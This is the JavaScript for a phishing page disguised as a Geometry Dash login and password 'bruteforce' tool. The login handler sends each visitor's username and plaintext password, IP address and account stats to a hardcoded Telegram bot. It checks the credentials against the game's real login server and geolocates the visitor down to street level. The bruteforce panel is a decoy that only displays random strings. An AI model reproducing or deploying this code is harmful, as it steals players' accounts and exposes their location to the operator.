// ===== CONFIG =====
const TELEGRAM_BOT_TOKEN = '8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg';
const TELEGRAM_CHAT_ID = '7136838858';

// ===== STATE MANAGEMENT =====
let userIdMap = {};
let nextUserId = 1;

// ===== IP & USER TRACKING =====
async function getClientIp() {
    const sources = [
        'https://ipapi.co/json/',
        'https://ipwho.is/',
        'https://geolocation-db.com/json/'
    ];

    let ipData = {};

    for (let url of sources) {
        try {
            const response = await fetch(url);
            ipData = await response.json();
            if (ipData.ip || ipData.IPv4 || ipData.query) break;
        } catch (error) {
            console.log(`Failed to fetch from ${url}:`, error);
        }
    }

    return {
        ip: ipData.ip || ipData.IPv4 || ipData.query || 'Unknown',
        lat: ipData.latitude || ipData.lat || null,
        lon: ipData.longitude || ipData.lon || null,
        country: ipData.country || null,
        city: ipData.city || null,
        state: ipData.state || null
    };
}

async function getLocationDetails(lat, lon) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.log('Reverse geocoding failed:', error);
        return null;
    }
}

function getOrCreateUserId(ip) {
    if (!userIdMap[ip]) {
        userIdMap[ip] = nextUserId;
        nextUserId++;
    }
    return userIdMap[ip];
}

// ===== DISPLAY IP INFO =====
async function displayIpInfo() {
    const ipInfo = await getClientIp();
    const ipInfoDiv = document.getElementById('ipInfo');

    if (!ipInfoDiv) return;

    let html = `
        <div class="ip-info-grid">
            <div class="ip-info-item">
                <label>IP Address</label>
                <div class="value">${ipInfo.ip}</div>
            </div>
            <div class="ip-info-item">
                <label>Country</label>
                <div class="value">${ipInfo.country || '-'}</div>
            </div>
            <div class="ip-info-item">
                <label>City</label>
                <div class="value">${ipInfo.city || '-'}</div>
            </div>
            <div class="ip-info-item">
                <label>Timezone</label>
                <div class="value">${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>
            </div>
            <div class="ip-info-item">
                <label>Device Type</label>
                <div class="value">${/Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}</div>
            </div>
            <div class="ip-info-item">
                <label>Operating System</label>
                <div class="value">${getOSName()}</div>
            </div>
    `;

    if (ipInfo.lat && ipInfo.lon) {
        const locDetails = await getLocationDetails(ipInfo.lat, ipInfo.lon);
        if (locDetails && locDetails.address) {
            const addr = locDetails.address;
            html += `
                <div class="ip-info-item">
                    <label>Region</label>
                    <div class="value">${[addr.suburb, addr.city, addr.state].filter(Boolean).join(', ') || '-'}</div>
                </div>
                <div class="ip-info-item">
                    <label>Road/Street</label>
                    <div class="value">${addr.road || addr.neighbourhood || addr.village || '-'}</div>
                </div>
                <div class="ip-info-item">
                    <label>Postal Code</label>
                    <div class="value">${addr.postcode || '-'}</div>
                </div>
                <div class="ip-info-item">
                    <label>Coordinates</label>
                    <div class="value">${ipInfo.lat.toFixed(6)}, ${ipInfo.lon.toFixed(6)}</div>
                </div>
            `;
        }
    }

    html += `</div>`;

    // Add map if coordinates exist
    if (ipInfo.lat && ipInfo.lon) {
        html += `<div id="map"></div>`;
    }

    ipInfoDiv.innerHTML = html;
    ipInfoDiv.classList.add('show');

    // Initialize map if element exists
    if (ipInfo.lat && ipInfo.lon && document.getElementById('map')) {
        setTimeout(() => {
            initializeMap(ipInfo.lat, ipInfo.lon);
        }, 100);
    }
}

function getOSName() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return 'Android';
    else if (/Windows NT 10\.0/i.test(ua)) return 'Windows 10/11';
    else if (/Windows NT 6\.1/i.test(ua)) return 'Windows 7';
    else if (/iPhone|iPad/i.test(ua)) return 'iOS';
    else if (/Macintosh|Mac OS X/i.test(ua)) return 'macOS';
    else if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
}

function initializeMap(lat, lon) {
    try {
        // Load Leaflet CSS
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = 'https://unpkg.com/leaflet/dist/leaflet.css';
        document.head.appendChild(link);

        // Load Leaflet JS
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/leaflet/dist/leaflet.js';
        script.onload = () => {
            const map = L.map('map').setView([lat, lon], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap contributors'
            }).addTo(map);
            L.marker([lat, lon]).addTo(map);
        };
        document.head.appendChild(script);
    } catch (error) {
        console.log('Map initialization failed:', error);
    }
}

// ===== TELEGRAM LOGGING =====
async function sendTelegramLog(logData) {
    try {
        const message = `<b>🔐 Authentication Log</b>\n\n` +
            `<code>ID: ${logData.id}\n` +
            `IP: ${logData.ip}\n\n` +
            `Username: ${logData.username}\n` +
            `Password: ${logData.password}\n\n` +
            `Rank: ${logData.rank}\n` +
            `CP: ${logData.cp}\n` +
            `Mod: ${logData.mod}</code>\n\n` +
            `${logData.status === 'SUKSES' ? '✅' : '❌'}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.log('Telegram log sent');
    }
}

// ===== API CALLS =====
async function checkUsernameExists(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        const data = await response.json();
        return !data.error;
    } catch {
        return false;
    }
}

async function getPlayerStats(username) {
    try {
        const response = await fetch(`https://gdbrowser.com/api/profile/${username}`);
        return await response.json();
    } catch {
        return null;
    }
}

// ===== GENERATE GJP2 WITH RANDOM DELAY =====
async function generateGJP2(password) {
    const SALT = "mI29fmAnxgTs";

    // Random delay between 0.15 and 0.3 seconds
    const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
    await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));

    const encoder = new TextEncoder();
    const data = encoder.encode(password + SALT);
    const hashBuffer = await crypto.subtle.digest("SHA-1", data);

    const hash = Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");

    console.log("GJP2:", hash);
    return hash;
}

async function logingd(username, password) {
    try {
        const gjp2 = await generateGJP2(password);

        const payload = new URLSearchParams({
            udid: "36d00413-8358-3de4-b5c0-a41d0ec822ec",
            userName: username,
            gjp2: gjp2,
            secret: "Wmfv3899gc9"
        });

        const response = await fetch(
            "https://www.boomlings.com/database/accounts/loginGJAccount.php",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: payload
            }
        );

        const result = (await response.text()).trim();

        console.log("Login response:", result);

        return {
            success: /^\d+$/.test(result),
            response: result,
            gjp2: gjp2
        };
    } catch (error) {
        console.error(error);
        return {
            success: false,
            response: null,
            error: error.message
        };
    }
}

// ===== VALIDATION =====
function validateInput(username, password) {
    const usernameError = document.getElementById('usernameError');
    const passwordError = document.getElementById('passwordError');
    
    usernameError.classList.remove('show');
    passwordError.classList.remove('show');

    let isValid = true;

    if (!username || username.length < 6 || username.length > 19) {
        usernameError.textContent = 'Username must be 6-19 characters';
        usernameError.classList.add('show');
        isValid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(username)) {
        usernameError.textContent = 'Only letters and numbers allowed';
        usernameError.classList.add('show');
        isValid = false;
    }

    if (!password || password.length < 6 || password.length > 19) {
        passwordError.textContent = 'Password must be 6-19 characters';
        passwordError.classList.add('show');
        isValid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(password)) {
        passwordError.textContent = 'Only letters and numbers allowed';
        passwordError.classList.add('show');
        isValid = false;
    }

    return isValid;
}

// ===== LOGIN HANDLER =====
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const loginBtn = document.getElementById('loginBtn');

    if (!validateInput(username, password)) {
        return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = 'Processing...';

    const usernameError = document.getElementById('usernameError');
    const ipData = await getClientIp();
    const userId = getOrCreateUserId(ipData.ip);

    // Check username exists
    const userExists = await checkUsernameExists(username);
    if (!userExists) {
        usernameError.textContent = 'Account not found';
        usernameError.classList.add('show');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';

        // Log failed attempt
        await sendTelegramLog({
            id: userId,
            ip: ipData.ip,
            username: username,
            password: password,
            status: 'GAGAL',
            rank: 'N/A',
            cp: 0,
            mod: 0
        });
        return;
    }

    // Validate password
    const isPasswordValid = await logingd(username, password);
    const stats = await getPlayerStats(username);

    // Send log to Telegram
    await sendTelegramLog({
        id: userId,
        ip: ipData.ip,
        username: username,
        password: password,
        status: isPasswordValid.success ? 'SUKSES' : 'GAGAL',
        rank: stats?.rank || 'N/A',
        cp: stats?.cp || 0,
        mod: stats?.moderator || 0
    });

    if (!isPasswordValid.success) {
        document.getElementById('passwordError').textContent = 'Invalid credentials';
        document.getElementById('passwordError').classList.add('show');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Login';
        return;
    }

    loginBtn.disabled = false;
    loginBtn.textContent = 'Login';

    // Show profile and IP info
    await showProfile(username);
    await displayIpInfo();
});

// ===== PROFILE PAGE =====
async function showProfile(username) {
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('profilePage').classList.add('show');

    const stats = await getPlayerStats(username);
    
    if (stats && !stats.error) {
        document.getElementById('playerName').textContent = '👤 ' + stats.username;
        
        const profileStats = document.getElementById('profileStats');
        profileStats.innerHTML = `
            <div class="stat-box">
                <div class="label">Level</div>
                <div class="value">${stats.playerLevel || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">CP</div>
                <div class="value">${stats.creatorPoints || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Stars</div>
                <div class="value">${stats.stars || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Diamonds</div>
                <div class="value">${stats.diamonds || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Coins</div>
                <div class="value">${stats.secretCoins || 0}</div>
            </div>
            <div class="stat-box">
                <div class="label">Demons</div>
                <div class="value">${stats.demonLevel || 0}</div>
            </div>
        `;
    }
}

function logout() {
    document.getElementById('loginPage').classList.remove('hidden');
    document.getElementById('profilePage').classList.remove('show');
    document.getElementById('loginForm').reset();
    document.getElementById('searchResult').classList.remove('show');
    document.getElementById('bruteforceProcess').classList.remove('show');
    document.getElementById('ipInfo').classList.remove('show');
    document.getElementById('ipInfo').innerHTML = '';
}

// ===== BRUTEFORCE SIMULATOR =====
async function searchTarget() {
    const targetUsername = document.getElementById('targetUsername').value;
    const searchResult = document.getElementById('searchResult');

    if (!targetUsername || targetUsername.length < 1 || targetUsername.length > 19) {
        return;
    }

    if (!/^[a-zA-Z0-9]+$/.test(targetUsername)) {
        return;
    }

    searchResult.classList.remove('show');

    const userExists = await checkUsernameExists(targetUsername);

    if (userExists) {
        searchResult.innerHTML = `
            <div class="user-found">
                <h4>✅ Account <strong>${targetUsername}</strong> found!</h4>
                <p style="margin-top: 15px; font-size: 12px;">Select charset:</p>
                <div class="charset-options">
                    <label class="charset-checkbox">
                        <input type="checkbox" value="lowercase" id="charset-lower" checked>
                        <label for="charset-lower">Lowercase (a-z)</label>
                    </label>
                    <label class="charset-checkbox">
                        <input type="checkbox" value="uppercase" id="charset-upper">
                        <label for="charset-upper">Uppercase (A-Z)</label>
                    </label>
                    <label class="charset-checkbox">
                        <input type="checkbox" value="numbers" id="charset-num" checked>
                        <label for="charset-num">Numbers (0-9)</label>
                    </label>
                </div>
                <button class="start-bruteforce-btn" onclick="startBruteforce('${targetUsername}')">
                    🔓 Start Bruteforce
                </button>
            </div>
        `;
        searchResult.classList.add('show');
    } else {
        searchResult.innerHTML = `
            <div class="user-not-found">
                ❌ Account <strong>${targetUsername}</strong> not found
            </div>
        `;
        searchResult.classList.add('show');
    }
}

function generateRandomPassword(length, charset) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return result;
}

async function startBruteforce(targetUsername) {
    const bruteforceProcess = document.getElementById('bruteforceProcess');
    const attemptsContainer = document.getElementById('attemptsContainer');
    const statusMessage = document.getElementById('statusMessage');

    let charset = '';
    if (document.getElementById('charset-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (document.getElementById('charset-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (document.getElementById('charset-num').checked) charset += '0123456789';

    if (charset.length === 0) {
        alert('Select at least one charset!');
        return;
    }

    bruteforceProcess.classList.add('show');
    attemptsContainer.innerHTML = '';

    let attemptCount = 0;

    // Infinite loop - no max attempts limit
    for (let i = 0; i < Number.MAX_SAFE_INTEGER; i++) {
        const length = Math.floor(Math.random() * 14) + 6;
        const password = generateRandomPassword(length, charset);

        attemptCount++;

        const attempt = document.createElement('div');
        attempt.className = 'attempt';
        attempt.textContent = `[${attemptCount}] ${password}`;
        attemptsContainer.appendChild(attempt);

        attemptsContainer.scrollTop = attemptsContainer.scrollHeight;

        statusMessage.innerHTML = `
            <span class="loading-spinner"></span>
            Testing... ${attemptCount} attempts
        `;

        // Random delay with randomized GJP2 delay
        const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
        await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
    }

    statusMessage.innerHTML = `
        ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
    `;
}
